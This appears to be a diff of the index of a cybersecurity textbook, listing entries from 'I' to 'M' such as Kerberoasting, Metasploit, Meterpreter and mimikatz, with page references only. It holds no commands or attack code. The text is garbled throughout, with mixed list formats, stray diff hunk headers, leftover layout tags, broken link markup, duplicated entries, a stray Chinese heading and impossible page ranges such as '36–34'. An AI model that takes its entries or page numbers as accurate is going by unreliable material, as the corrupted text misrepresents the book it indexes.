--   ICSs (Industrial Control Systems), `[153`, `652`–`653`](#c04.xhtml#Page_153), 652–653
+- `I`
 
--   IDA Free, `[366`](#c08.xhtml#Page_366)
+- `I Love You` virus, `[342`, `437`–`438`](#c08.xhtml#Page_342), 437–438
 
--   IDA Pro, `[358`–`359`, `366`](#c08.xhtml#Page_358)–359, 366
-
--   IDE (integrated development environment), `[366`](#c08.xhtml#Page_366)
-
--   identification failures, as one of OWASP top ten vulnerabilities, `[514`–`515`](#c12.xhtml#Page_514)–515
-
--   Identification field, `[33`](#c02.xhtml#Page_33)
-
--   identity and access management (IAM) system, `[603`, `621`, `639`, `654`](#c14.xhtml#Page_603), 621, 639, 654
-
--   Identity function, in NIST Cybersecurity Framework, `[599`–`600`](#c14.xhtml#Page_599)–600
-
--   identity theft, `[441`](#c10.xhtml#Page_441)
-
--   iDevices, `[647`–`648`](#c15.xhtml#Page_647)–648
-
--   IDSs (intrusion detection systems), `[80`–`83`](#c03.xhtml#Page_80)–83
-
--   IEEE (Institute of Electrical and Electronics Engineers), `[472`](#c11.xhtml#Page_472)
-
--   IETF (Internet Engineering Task Force), `[32`](#c02.xhtml#Page_32)
-
--   Immunity Debugger, `[366`](#c08.xhtml#Page_366)
-
--   Impact stage, in MITRE ATT&CK framework, `[11`, `75`](#c01.xhtml#Page_11), 75
-
--   impersonation, `[440`–`441`](#c10.xhtml#Page_440)–441
-
--   Industrial Control Systems (ICSs), `[153`, `652`–`653`](#c04.xhtml#Page_153), 652–653
-
--   information assurance, risk and, `[66`–`69`](#c03.xhtml#Page_66)–69
-
--   infrastructure as a service (IaaS)a 
+- `IaaS` (infrastructure as a service) 
 
     * about, `[48`–`49`](#c02.xhtml#Page_48)–49
 
     * of malware, `[382`–`384`](#c08.xhtml#Page_382)–384
 
--   infrastructure as code (IaC), `[629`, `631`](#c15.xhtml#Page_629), 631
+- `IaC` (infrastructure as code), `[629`, `631`](#c15.xhtml#Page_629), 631
 
--   infrastructure network, `[474`–`475`](#c11.xhtml#Page_474)–475
+- `IAM` (identity and access management) system, `[603`, `621`, `639`, `654`](#c14.xhtml#Page_603), 621, 639, 654
 
--   Initial Access stage, in MITRE ATT&CK framework, `[10`, `73`](#c01.xhtml#Page_10), 73
+- `IANA` (Internet Assigned Numbers Authority), `[106`, `109`](#c04.xhtml#Page_106), 109
 
--   Initial Compromise stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
+- `IBM` `[360`, `612`–`613`](#c08.xhtml#Page_360), 612–613
 
--   Initial Reconnaissance stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
+- `ICANN` (Internet Corporation for Assigned Names and Numbers), `[106`](#c04.xhtml#Page_106)
 
--   injection, as one of OWASP top ten vulnerabilities, `[514`](#c12.xhtml#Page_514)
+- `ICMP` (Internet Control Message Protocol), `[41`–`42`, `75`, `527`](#c02.xhtml#Page_41)–42, 75, 527
 
--   insecure design, as one of OWASP top ten vulnerabilities, `[514`](#c12.xhtml#Page_514)
+- `ICSs` (Industrial Control Systems), `[153`, `652`–`653`](#c04.xhtml#Page_153), 652–653
 
--   `INSERT INTO` query, `[598`](#c14.xhtml#Page_598)
+- `IDA Free`, `[366`](#c08.xhtml#Page_366)
 
--   insider threat, as a common cloud threat, `[645`](#c15.xhtml#Page_645)
+- `IDA Pro`, `[358`–`359`, `366`](#c08.xhtml#Page_358)–359, 366
 
--   InSpy tool, `[122`](#c04.xhtml#Page_122)
+- `IDE` (integrated development environment), `[366`](#c08.xhtml#Page_366)
 
--   Installation stage, in Lockheed Martin Cyber Kill Chain, `[8`, `602`](#c01.xhtml#Page_8), 602
+- identification failures, as one of OWASP top ten vulnerabilities, `[514`–`515`](#c12.xhtml#Page_514)–515
 
--   Institute of Electrical and Electronics Engineers (IEEE), `[472`](#c11.xhtml#Page_472)
+- Identification field, `[33`](#c02.xhtml#Page_33)
 
--   integrated development environment (IDE), `[366`](#c08.xhtml#Page_366)
+- identity and access management (`IAM`) system, `[603`, `621`, `639`, `654`](#c14.xhtml#Page_603), 621, 639, 654
 
--   integrity 
+- Identity function, in NIST Cybersecurity Framework, `[599`–`600`](#c14.xhtml#Page_599)–600
+
+- identity theft, `[441`](#c10.xhtml#Page_441)
+
+- `iDevices`, `[647`–`648`](#c15.xhtml#Page_647)–648
+
+- `IDSs` (intrusion detection systems), `[80`–`83`](#c03.xhtml#Page_80)–83
+
+- `IEEE` (Institute of Electrical and Electronics Engineers), `[472`](#c11.xhtml#Page_472)
+
+- `IETF` (Internet Engineering Task Force), `[32`](#c02.xhtml#Page_32)
+
+- `Immunity Debugger`, `[366`](#c08.xhtml#Page_366)
+
+- Impact stage, in MITRE ATT&CK framework, `[11`, `75`](#c01.xhtml#Page_11), 75
+
+- impersonation, `[440`–`441`](#c10.xhtml#Page_440)–441
+
+- Industrial Control Systems (`ICSs`), `[153`, `652`–`653`](#c04.xhtml#Page_153), 652–653
+
+- information assurance, risk and, `[66`–`69`](#c03.xhtml#Page_66)–69
+
+- infrastructure as a service (`IaaS`)a 
+
+    * about, `[48`–`49`](#c02.xhtml#Page_48)–49
+
+    * of malware, `[382`–`384`](#c08.xhtml#Page_382)–384
+
+- infrastructure as code (`IaC`), `[629`, `631`](#c15.xhtml#Page_629), 631
+
+- infrastructure network, `[474`–`475`](#c11.xhtml#Page_474)–475
+
+- Initial Access stage, in MITRE ATT&CK framework, `[10`, `73`](#c01.xhtml#Page_10), 73
+
+- Initial Compromise stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
+
+- Initial Reconnaissance stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
+
+- injection, as one of OWASP top ten vulnerabilities, `[514`](#c12.xhtml#Page_514)
+
+- insecure design, as one of OWASP top ten vulnerabilities, `[514`](#c12.xhtml#Page_514)
+
+- `INSERT INTO` query, `[598`](#c14.xhtml#Page_598)
+
+- insider threat, as a common cloud threat, `[645`](#c15.xhtml#Page_645)
+
+- `InSpy` tool, `[122`](#c04.xhtml#Page_122)
+
+- Installation stage, in Lockheed Martin Cyber Kill Chain, `[8`, `602`](#c01.xhtml#Page_8), 602
+
+- Institute of Electrical and Electronics Engineers (`IEEE`), `[472`](#c11.xhtml#Page_472)
+
+- integrated development environment (`IDE`), `[366`](#c08.xhtml#Page_366)
+
+- integrity 
 
     * in CIA triad, `[63`–`64`](#c03.xhtml#Page_63)–64
 
     * of data, `[585`](#c14.xhtml#Page_585)
 
--   Integrity Verification Procedure (IVP), `[587`](#c14.xhtml#Page_587)
+- Integrity Verification Procedure (`IVP`), `[587`](#c14.xhtml#Page_587)
 
--   intelligence 
+- intelligence 
 
     * of technology, `[150`–`154`](#c04.xhtml#Page_150)–154
 
     * of websites, `[145`–`149`](#c04.xhtml#Page_145)–149
 
--   intelligence‑driven groups, ransomware and, `[346`](#c08.xhtml#Page_346)
+- intelligence‑driven groups, ransomware and, `[346`](#c08.xhtml#Page_346)
 
--   Internal Reconnaissance stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
+- Internal Reconnaissance stage, in life cycle, `[9`, `536`](#c01.xhtml#Page_9), 536
 
--   International Organization for Standardization (ISO), `[20`, `71`, `601`](#c02.xhtml#Page_20), 71, 601
+- International Organization for Standardization (`ISO`), `[20`, `71`, `601`](#c02.xhtml#Page_20), 71, 601
 
--   Internet Assigned Numbers Authority (IANA), `[106`, `109`](#c04.xhtml#Page_106), 109
+- Internet Assigned Numbers Authority (`IANA`), `[106`, `109`](#c04.xhtml#Page_106), 109
 
--   Internet Control Message Protocol (ICMP), `[41`–`42`, `75`, `527`](#c02.xhtml#Page_41)–42, 75, 527
+- Internet Control Message Protocol (`ICMP`), `[41`–`42`, `75`, `527`](#c02.xhtml#Page_41)–42, 75, 527
 
--   Internet Corporation for Assigned Names and Numbers (ICANN), `[106`](#c04.xhtml#Page_106)
+- Internet Corporation for Assigned Names and Numbers (`ICANN`), `[106`](#c04.xhtml#Page_106)
 
--   Internet Engineering Task Force (IETF), `[32`](#c02.xhtml#Page_32)
+- Internet Engineering Task Force (`IETF`), `[32`](#c02.xhtml#Page_32)
 
--   Internet of Things (IoT) 
+- Internet of Things (`IoT`) 
 
     * about, `[53`, `152`–`154`, `612`, `646`–`651`, `655`–`656`](#c02.xhtml#Page_53), 152–154, 612, 646–651, 655–656
 
@@ -14673,7 +15554,7 @@ content‑addressable memory (CAM), [30](#c0><x_0.3219><y_0.6969>><class_Caption
 
     * review questions, `[657`–`661`](#c15.xhtml#Page_657)–661
 
--   Internet Protocol (IP) 
+- Internet Protocol (`IP`) 
 
     * about, `[31`–`32`](#c02.xhtml#Page_31)–32
 
@@ -14681,358 +15562,269 @@ content‑addressable memory (CAM), [30](#c0><x_0.3219><y_0.6969>><class_Caption
 
     * architecture, `[23`–`24`](#c02.xhtml#Page_23)–24
 
+* headers, 32–34
 
+* as a Network layer protocol, 22
 
-*   headers, 32–34
-*   as a Network layer protocol, 22
-*   subnets, 35–37
-*   Internet Relay Chat (IRC), 383
-*   Internet service provider (ISP), 529
-*   Internetwork Packet Exchange (IPX), 31
-*   intrusion detection systems (IDSs), 80–83
-*   intrusion prevention systems (IPSs), 83–84
-*   Invocation Property, 585
-*   IoT (Internet of Things) 
-    *   about, 53, 152–154, 612, 646–651, 655–656
-    *   answers to review questions, 695–697
-    *   fog computing, 651–652
-    *   operational technology, 652–65. 655
-    *   review questions, 657–661
-*   IP (Internet Protocol) 
-    *   about, 31–32
-    *   addressing, 34–35
-    *   architecture, 23–24
-    *   headers, 36–34
-    *   as a Network layer protocol, 22
-    *   subnets, 35–37
-*   IP Security (IPSec), 46
-*   IPSs (intrusion prevention systems), 83–84
-*   `iptables`, 459–460
-*   IPv4, 31–32, 34–35
-*   IPv6, 31–32, 34–35, 46
-*   IPX (Internetwork Packet Exchange), 31
-*   IRC (Internet Relay Chat), 383
-*   iris scanning, 445
-*   ISO (International Organization for Standardization), 20, 71, 601
-*   ISO 27001/27002, 71, 601
-*   isolation, network, 44–45
-*   ISP (Internet service provider), 529
-*   IVP (Integrity Verification Procedure), 587
-*   `iwconfig` program, 489
-*   Java archive (JAR), 240–241, 458
-*   Java Development Kit (JDK), 242, 359
-*   Java runtime engine (JRE), 242
-*   Java Server Pages (JSP) process, 328
-*   JavaScript Object Notation (JSON), 384, 596–597, 633
-*   JBoss, 617
-*   JDK (Java Development Kit), 242, 359
-*   job sites, 128–129
-*   John the Ripper, 296–298
-*   Joint Photographic Experts Group (JPEG) format, as a Presentation layer protocol, 21
-*   JRE (Java runtime engine), 242
-*   JSON (JavaScript Object Notation), 384, 596–597, 633
-*   JSP (Java Server Pages) process, 328
-*   Just Works, 496
-*   Kali Linux, 267, 282, 312, 459, 494
-*   Kaminsky, Dan, 3–4
-*   KDC (key distribution center), 300–301
-*   Kerberoasting, 300–304
-*   Kerberos, 300–304
-*   key distribution center (KDC), 300–301
-*   key reinstallation, 493–494
-*   Key Reinstallation Attack (KRACK), 484, 494
-*   Kibana, 86
-*   Kismet, 485
-*   KRACK (Key Reinstallation Attack), 484, 494
-*   Krebs, Brian, 528
-*   Krebs on Security, 528, 529
-*   Kubernetes, 593
-*   L2CAP (Logic Link Control and Adaptation Protocol), 499
-*   LAN (Local Area Network), 43
-*   LAND (local area network denial) attack, 531
-*   Lateral Movement stage, in MITRE ATT&CK framework, 9, 11, 74, 536–538
-*   Latin America and Caribbean Network Information Centre (LACNIC), 110
-*   layered systems, for applications, 635
-*   `LD_PRELOAD` variable, 329
-*   legacy attacks, 531
-*   lift‐and‐shift approach, 625
-*   Lightweight Extensible Authentication Protocol (LEAP), 481
-*   liking, in theory of influence, 437
-*   LinkedIn, 120–123
-*   Linux 
-    *   about, 651
-    *   ARP cache duration on, 419
-    *   privilege escalation, 318–319
-*   Linux Unified Key Setup (LUKS), 575
-*   living off the land, 307–308
-*   Local Area Network (LAN), 43
-*   local area network denial (LAND) attack, 531
-*   Lockheed Martin Cyber Kill Chain, 72, 601–602
-*   log management system, 86
-*   log manipulation, 329
-*   logging, 91–93, 541
-*   Logic Link Control and Adaptation Protocol (L2CAP), 499
-*   low and slow, as an evasion technique, 220
-*   Low Orbit Ion Cannon (LOIC), 528
-*   LucidChart, 618
-*   Lucifer cipher, 555–556
-*   LUKS (Linux Unified Key Setup), 575
+* subnets, 35–37
 
+* Internet Relay Chat (`IRC`), 383
 
+* Internet service provider (`ISP`), 529
 
--   worm, `[342`](`#c08.xhtml#Page_342`)–343
+* Internetwork Packet Exchange (`IPX`), 31
 
--   Malware Behavior Catalog (MBC), `[371`](`#c08.xhtml#Page_371`)
+* intrusion detection systems (`IDSs`), 80–83
 
--   MAN (Metropolitan Area Network), `[43`](`#c02.xhtml#Page_43`)
+* intrusion prevention systems (`IPSs`), 83–84
 
--   man traps, `[444`](`#c10.xhtml#Page_444`)–445
+* Invocation Property, 585
 
--   management information bases (MIBs), `[258`](`#c06.xhtml#Page_258`)
+* `IoT` (Internet of Things) 
 
--   Mandiant, `[370`](`#c08.xhtml#Page_370`)–371
+    * about, 53, 152–154, 612, 646–651, 655–656
 
--   man‑in‑the‑middle attack, `[63`](`#c03.xhtml#Page_63`), `[420`](`#c09.xhtml#Page_420`)
+    * answers to review questions, 695–697
 
--   manufacturing execution systems (MES), `[654`](`#c15.xhtml#Page_654`)
+    * fog computing, 651–652
 
--   manufacturing operational technology (MOM) systems, `[654`](`#c15.xhtml#Page_654`)
+    * operational technology, 652–65. 655
 
--   Martian packets, `[538`](`#c12.xhtml#Page_538`)
+    * review questions, 657–661
 
--   Massachusetts Institute of Technology (MIT), `[114`](`#c04.xhtml#Page_114`), `[300`](`#c07.xhtml#Page_300`)
+* `IP` (Internet Protocol) 
 
--   `masscan`, `[184`](`#c05.xhtml#Page_184`)–185
+    * about, 31–32
 
--   MAUs (multistation access units), `[26`](`#c02.xhtml#Page_26`)
+    * addressing, 34–35
 
--   maximum transmission unit (MTU), `[395`](`#c09.xhtml#Page_395`)
+    * architecture, 23–24
 
--   Maze, `[346`](`#c08.xhtml#Page_346`)
+    * headers, 36–34
 
--   MBC (Malware Behavior Catalog), `[371`](`#c08.xhtml#Page_371`)
+    * as a Network layer protocol, 22
 
--   MD5 (Message Digest `[5`](`#c01.xhtml#Page_5`)), `[298`](`#c07.xhtml#Page_298`), `[356`](`#c08.xhtml#Page_356`)–358, `[569`](`#c13.xhtml#Page_569`)–570
+    * subnets, 35–37
 
--   `mdk3/4` tool, `[494`](`#c11.xhtml#Page_494`)–495
+* IP Security (`IPSec`), 46
 
--   media access control (MAC) address 
+* `IPSs` (intrusion prevention systems), 83–84
 
-    -   about, `[427`](`#c09.xhtml#Page_427`), `[490`](`#c11.xhtml#Page_490`), `[647`](`#c15.xhtml#Page_647`)
+* `iptables`, 459–460
 
-    -   format of, `[30`](`#c02.xhtml#Page_30`)
+* `IPv4`, 31–32, 34–35
 
--   MegaPing 
+* `IPv6`, 31–32, 34–35, 46
 
-    -   ping sweeps using, `[165`](`#c05.xhtml#Page_165`)–166
+* `IPX` (Internetwork Packet Exchange), 31
 
-    -   for port scanning, `[185`](`#c05.xhtml#Page_185`)–186
-
--   MES (manufacturing execution systems), `[654`](`#c15.xhtml#Page_654`)
-
--   mesh network, `[27`](`#c02.xhtml#Page_27`)–28
-
--   message authentication code (MAC), `[479`](`#c11.xhtml#Page_479`), `[569`](`#c13.xhtml#Page_569`)
-
--   Message Digest `[5`](`#c01.xhtml#Page_5`) (MD5), `[298`](`#c07.xhtml#Page_298`), `[356`](`#c08.xhtml#Page_356`)–358, `[569`](`#c13.xhtml#Page_569`)–570
-
--   message integrity check (MIC), `[479`](`#c11.xhtml#Page_479`)
-
--   Message Queuing Telemetry Transport (MQTT), `[52`](`#c02.xhtml#Page_52`)
-
--   Metasploit 
-
-    -   about, `[250`](`#c06.xhtml#Page_250`)–254
-
-    -   creating malware using, `[375`](`#c08.xhtml#Page_375`)–381
-
-    -   finding vulnerabilities with, `[209`](`#c05.xhtml#Page_209`)–210
-
-    -   modules, `[286`](`#c07.xhtml#Page_286`)–289
-
-    -   for port scanning, `[188`](`#c05.xhtml#Page_188`)–190
-
-    -   `sunrpc` scanner, `[238`](`#c06.xhtml#Page_238`)–239
-
--   Meterpreter 
-
-    -   about, `[292`](`#c07.xhtml#Page_292`)–295, `[324`](`#c07.xhtml#Page_324`)–325
-
-    -   clearing Event Viewer in, `[329`](`#c07.xhtml#Page_329`)
-
--   methods, `[626`](`#c15.xhtml#Page_626`)
-
--   Metropolitan Area Network (MAN), `[43`](`#c02.xhtml#Page_43`)
-
--   Metsvc, `[324`](`#c07.xhtml#Page_324`)
-
--   MFA (multifactor authentication), `[603`](`#c14.xhtml#Page_603`), `[645`](`#c15.xhtml#Page_645`)
-
--   `mfsconsole`, Firefox Exploit Module in, `[305`](`#c07.xhtml#Page_305`)–306
-
--   MIBs (management information bases), `[258`](`#c06.xhtml#Page_258`)
-
--   MIC (message integrity check), `[479`](`#c11.xhtml#Page_479`)
-
--   Microsoft 
-
-    -   about, `[50`](`#c02.xhtml#Page_50`), `[104`](`#c04.xhtml#Page_104`)–105
-
-    -   Internet Information Services (IIS), `[513`](`#c12.xhtml#Page_513`), `[589`](`#c14.xhtml#Page_589`)
-
-    -   SQL Server, `[595`](`#c14.xhtml#Page_595`)–596
-
--   Microsoft `[365`](`#c08.xhtml#Page_365`) (M365), `[626`](`#c15.xhtml#Page_626`)
-
--   Microsoft Azure, `[617`](`#c15.xhtml#Page_617`), `[626`](`#c15.xhtml#Page_626`), `[639`](`#c15.xhtml#Page_639`)
-
--   Microsoft Hyper‑V server, `[631`](`#c15.xhtml#Page_631`)
-
--   Microsoft Office `[365`](`#c08.xhtml#Page_365`) (O365), `[626`](`#c15.xhtml#Page_626`)
-
--   Microsoft OneDrive, `[619`](`#c15.xhtml#Page_619`)
-
--   Microsoft Teams, `[501`](`#c11.xhtml#Page_501`)
-
--   Microsoft's Surface, `[483`](`#c11.xhtml#Page_483`)
-
--   Mimikatz, `[537`](`#c12.xhtml#Page_537`)
-
--   `mimikatz` module, `[293`](`#c07.xhtml#Page_293`)
-
--   misconfigurations, as a weakness of web applications, `[642`](`#c15.xhtml#Page_642`)–643
-
--   MIT (Massachusetts Institute of Technology), `[114`](`#c04.xhtml#Page_114`), `[300`](`#c07.xhtml#Page_300`)
-
--   mitigation, of risk, `[69`](`#c03.xhtml#Page_69`)
-
--   Mitnick, Ryan, `[8`](`#c01.xhtml#Page_8`)
-
--   MITRE, `[163`](`#c05.xhtml#Page_163`)
-
--   MITRE ATT&CK framework 
-
-    -   about, `[10`](`#c01.xhtml#Page_10`)–11, `[72`](`#c03.xhtml#Page_72`), `[232`](`#c06.xhtml#Page_232`)
-
-    -   malware analysis and, `[371`](`#c08.xhtml#Page_371`)
-
-    -   stages of, `[73`](`#c03.xhtml#Page_73`)–75
-
-    -   website, `[75`](`#c03.xhtml#Page_75`)
-
--   mobile devices 
-
-    -   about, `[499`](`#c11.xhtml#Page_499`)–500
-
-    -   attacks on, `[500`](`#c11.xhtml#Page_500`)–504
-
--   models 
-
-    -   for communication, `[19`](`#c02.xhtml#Page_19`)–24
-
-    -   defined, `[18`](`#c02.xhtml#Page_18`)
-
-    -   security, `[584`](`#c14.xhtml#Page_584`)–587
-
--   model‑view‑controller (MVC) design, `[588`](`#c14.xhtml#Page_588`)–589
-
--   `mod_security`, `[525`](`#c12.xhtml#Page_525`)
-
--   modules (Metasploit), `[286`](`#c07.xhtml#Page_286`)–289
-
--   MOM (manufacturing operational technology) systems, `[654`](`#c15.xhtml#Page_654`)
-
--   MongoDB, `[597`](`#c14.xhtml#Page_597`)
-
--   Morris, Robert T., `[342`](`#c08.xhtml#Page_342`)
-
--   Move Laterally stage, in life cycle, `[536`](`#c12.xhtml#Page_536`)
-
--   MPLS (Multiprotocol Label Switching), `[45`](`#c02.xhtml#Page_45`)
-
--   MQTT (Message Queuing Telemetry Transport), `[52`](`#c02.xhtml#Page_52`)
-
--   MS16‑032 vulnerability, `[317`](`#c07.xhtml#Page_317`)
-
--   `msfconsole` program, `[190`](`#c05.xhtml#Page_190`), `[286`](`#c07.xhtml#Page_286`)–289, `[291`](`#c07.xhtml#Page_291`), `[375`](`#c08.xhtml#Page_375`)
-
--   `msfvenom` program, `[323`](`#c07.xhtml#Page_323`)–324, `[381`](`#c08.xhtml#Page_381`)
-
--   MTU (maximum transmission unit), `[395`](`#c09.xhtml#Page_395`)
-
--   multifactor authentication (MFA), `[603`](`#c14.xhtml#Page_603`), `[645`](`#c15.xhtml#Page_645`)
-
--   Multiprotocol Label Switching (MPLS), `[45`](`#c02.xhtml#Page_45`)
-
--   multistation access units (MAUs), `[26`](`#c02.xhtml#Page_26`)
-
--   multitenancy, `[615`](`#c15.xhtml#Page_615`)
-
--   MVC (model‑view‑controller) design, `[588`](`#c14.xhtml#Page_588`)–589
-
--   MX (mail exchange) records, `[132`](`#c04.xhtml#Page_132`), `[136`](`#c04.xhtml#Page_136`)
-
--   MySQL, `[520`](`#c12.xhtml#Page_520`), `[595`](`#c14.xhtml#Page_595`)
-
--   NAC (network access control), `[483`](`#c11.xhtml#Page_483`)
-
--   name server (NS) records, `[132`](`#c04.xhtml#Page_132`), `[135`](`#c04.xhtml#Page_135`)
-
--   NASL (Network Attack Scripting Language) scripts, `[209`](`#c05.xhtml#Page_209`)
-
--   NAT (network address translation), `[51`](`#c02.xhtml#Page_51`)
-
--   National Institute of Standards and Technology (NIST) 
-
-    -   about, `[70`](`#c03.xhtml#Page_70`)–71, `[556`](`#c13.xhtml#Page_556`)
-
-    -   Cybersecurity Framework, `[599`](`#c14.xhtml#Page_599`)
-
-    -   800‑207, `[602`](`#c14.xhtml#Page_602`)–603
-
-    -   Special Publication 800‑53, `[600`](`#c14.xhtml#Page_600`)
-
--   National Security Agency (NSA), `[209`](`#c05.xhtml#Page_209`), `[346`](`#c08.xhtml#Page_346`), `[358`](`#c08.xhtml#Page_358`)
-
--   nation‑state actors, `[8`](`#c01.xhtml#Page_8`)
-
--   `nbstat`, `[244`](`#c06.xhtml#Page_244`), `[245`](`#c06.xhtml#Page_245`)–246
-
--   near‑field communication (NFC), `[496`](`#c11.xhtml#Page_496`)
-
--   Nessus, `[203`](`#c05.xhtml#Page_203`)–209, `[286`](`#c07.xhtml#Page_286`), `[650`](`#c15.xhtml#Page_650`)–651
-
--   `net` utility, `[246`](`#c06.xhtml#Page_246`)–247
-
--   NetBIOS Enumerator, `[244`](`#c06.xhtml#Page_244`), `[249`](`#c06.xhtml#Page_249`)–250
-
--   `netcat`, `[319`](`#c07.xhtml#Page_319`), `[378`](`#c08.xhtml#Page_378`), `[648`](`#c15.xhtml#Page_648`)
-
--   NetFlow, `[541`](`#c12.xhtml#Page_541`)
-
--   NetSpot, `[485`](`#c11.xhtml#Page_485`)
-
--   network access control (NAC), `[483`](`#c11.xhtml#Page_483`)
-
--   network address translation (NAT), `[51`](`#c02.xhtml#Page_51`)
-
--   Network Attack Scripting Language (NASL) scripts, `[209`](`#c05.xhtml#Page_209`)
-
--   network blocks, `[645`](`#c15.xhtml#Page_645`)
-
--   Network File Server (NFS), `[237`](`#c06.xhtml#Page_237`)
-
--   network IDS, `[80`](`#c03.xhtml#Page_80`)–83
-
--   network interface cards (NICs), `[395`](`#c09.xhtml#Page_395`)
-
--   Network layer (OSI model), `[22`](`#c02.xhtml#Page_22`)
-
--   network stacks. *See* `[stacks`](`#b02.xhtml#ind1603`)
-
-
-
-# 网络漏洞测试 (NVTs)
+* `IRC` (Internet Relay Chat), 383
+
+* iris scanning, 445
+
+* `ISO` (International Organization for Standardization), 20, 71, 601
+
+* `ISO` 27001/27002, 71, 601
+
+* isolation, network, 44–45
+
+* `ISP` (Internet service provider), 529
+
+* `IVP` (Integrity Verification Procedure), 587
+
+* `iwconfig` program, 489
+
+* Java archive (`JAR`), 240–241, 458
+
+
+
+- Java Development Kit (JDK), 242, 359
+- Java runtime engine (JRE), 242
+- Java Server Pages (JSP) process, 328
+- JavaScript Object Notation (JSON), 384, 596–597, 633
+- JBoss, 617
+- JDK (Java Development Kit), 242, 359
+- job sites, 128–129
+- John the Ripper, 296–298
+- Joint Photographic Experts Group (JPEG) format, as a Presentation layer protocol, 21
+- JRE (Java runtime engine), 242
+- JSON (JavaScript Object Notation), 384, 596–597, 633
+- JSP (Java Server Pages) process, 328
+- Just Works, 496
+- Kali Linux, 267, 282, 312, 459, 494
+- Kaminsky, Dan, 3–4
+- KDC (key distribution center), 300–301
+- Kerberoasting, 300–304
+- Kerberos, 300–304
+- key distribution center (KDC), 300–301
+- key reinstallation, 493–494
+- Key Reinstallation Attack (KRACK), 484, 494
+- Kibana, 86
+- Kismet, 485
+- KRACK (Key Reinstallation Attack), 484, 494
+- Krebs, Brian, 528
+- Krebs on Security, 528, 529
+- Kubernetes, 593
+- L2CAP (Logic Link Control and Adaptation Protocol), 499
+- LAN (Local Area Network), 43
+- LAND (local area network denial) attack, 531
+- Lateral Movement stage, in MITRE ATT&CK framework, 9, 11, 74, 536–538
+- Latin America and Caribbean Network Information Centre (LACNIC), 110
+- layered systems, for applications, 635
+- `LD_PRELOAD` variable, 329
+- legacy attacks, 531
+- lift‐and‐shift approach, 625
+- Lightweight Extensible Authentication Protocol (LEAP), 481
+- liking, in theory of influence, 437
+- LinkedIn, 120–123
+- Linux
+    - about, 651
+    - ARP cache duration on, 419
+    - privilege escalation, 318–319
+- Linux Unified Key Setup (LUKS), 575
+- living off the land, 307–308
+- Local Area Network (LAN), 43
+- local area network denial (LAND) attack, 531
+- Lockheed Martin Cyber Kill Chain, 72, 601–602
+- log management system, 86
+- log manipulation, 329
+- logging, 91–93, 541
+- Logic Link Control and Adaptation Protocol (L2CAP), 499
+- low and slow, as an evasion technique, 220
+- Low Orbit Ion Cannon (LOIC), 528
+- LucidChart, 618
+- Lucifer cipher, 555–556
+- LUKS (Linux Unified Key Setup), 575
+- worm, [342](#c08.xhtml#Page_342)–343
+- Malware Behavior Catalog (MBC), [371](#c08.xhtml#Page_371)
+- MAN (Metropolitan Area Network), [43](#c02.xhtml#Page_43)
+- man traps, [444](#c10.xhtml#Page_444)–445
+- management information bases (MIBs), [258](#c06.xhtml#Page_258)
+- Mandiant, [370](#c08.xhtml#Page_370)–371
+- man‑in‑the‑middle attack, [63](#c03.xhtml#Page_63), [420](#c09.xhtml#Page_420)
+- manufacturing execution systems (MES), [654](#c15.xhtml#Page_654)
+- manufacturing operational technology (MOM) systems, [654](#c15.xhtml#Page_654)
+- Martian packets, [538](#c12.xhtml#Page_538)
+- Massachusetts Institute of Technology (MIT), [114](#c04.xhtml#Page_114), [300](#c07.xhtml#Page_300)
+- `masscan`, [184](#c05.xhtml#Page_184)–185
+- MAUs (multistation access units), [26](#c02.xhtml#Page_26)
+- maximum transmission unit (MTU), [395](#c09.xhtml#Page_395)
+- Maze, [346](#c08.xhtml#Page_346)
+- MBC (Malware Behavior Catalog), [371](#c08.xhtml#Page_371)
+- MD5 (Message Digest [5](#c01.xhtml#Page_5)), [298](#c07.xhtml#Page_298), [356](#c08.xhtml#Page_356)–358, [569](#c13.xhtml#Page_569)–570
+- `mdk3/4` tool, [494](#c11.xhtml#Page_494)–495
+- media access control (MAC) address
+    - about, [427](#c09.xhtml#Page_427), [490](#c11.xhtml#Page_490), [647](#c15.xhtml#Page_647)
+    - format of, [30](#c02.xhtml#Page_30)
+- MegaPing
+    - ping sweeps using, [165](#c05.xhtml#Page_165)–166
+    - for port scanning, [185](#c05.xhtml#Page_185)–186
+- MES (manufacturing execution systems), [654](#c15.xhtml#Page_654)
+- mesh network, [27](#c02.xhtml#Page_27)–28
+- message authentication code (MAC), [479](#c11.xhtml#Page_479), [569](#c13.xhtml#Page_569)
+- Message Digest [5](#c01.xhtml#Page_5) (MD5), [298](#c07.xhtml#Page_298), [356](#c08.xhtml#Page_356)–358, [569](#c13.xhtml#Page_569)–570
+- message integrity check (MIC), [479](#c11.xhtml#Page_479)
+- Message Queuing Telemetry Transport (MQTT), [52](#c02.xhtml#Page_52)
+- Metasploit
+    - about, [250](#c06.xhtml#Page_250)–254
+    - creating malware using, [375](#c08.xhtml#Page_375)–381
+    - finding vulnerabilities with, [209](#c05.xhtml#Page_209)–210
+    - modules, [286](#c07.xhtml#Page_286)–289
+    - for port scanning, [188](#c05.xhtml#Page_188)–190
+    - `sunrpc` scanner, [238](#c06.xhtml#Page_238)–239
+- Meterpreter
+    - about, [292](#c07.xhtml#Page_292)–295, [324](#c07.xhtml#Page_324)–325
+    - clearing Event Viewer in, [329](#c07.xhtml#Page_329)
+- methods, [626](#c15.xhtml#Page_626)
+- Metropolitan Area Network (MAN), [43](#c02.xhtml#Page_43)
+- Metsvc, [324](#c07.xhtml#Page_324)
+- MFA (multifactor authentication), [603](#c14.xhtml#Page_603), [645](#c15.xhtml#Page_645)
+- `mfsconsole`, Firefox Exploit Module in, [305](#c07.xhtml#Page_305)–306
+- MIBs (management information bases), [258](#c06.xhtml#Page_258)
+- MIC (message integrity check), [479](#c11.xhtml#Page_479)
+- Microsoft
+    - about, [50](#c02.xhtml#Page_50), [104](#c04.xhtml#Page_104)–105
+    - Internet Information Services (IIS), [513](#c12.xhtml#Page_513), [589](#c14.xhtml#Page_589)
+    - SQL Server, [595](#c14.xhtml#Page_595)–596
+- Microsoft [365](#c08.xhtml#Page_365) (M365), [626](#c15.xhtml#Page_626)
+- Microsoft Azure, [617](#c15.xhtml#Page_617), [626](#c15.xhtml#Page_626), [639](#c15.xhtml#Page_639)
+- Microsoft Hyper‑V server, [631](#c15.xhtml#Page_631)
+- Microsoft Office [365](#c08.xhtml#Page_365) (O365), [626](#c15.xhtml#Page_626)
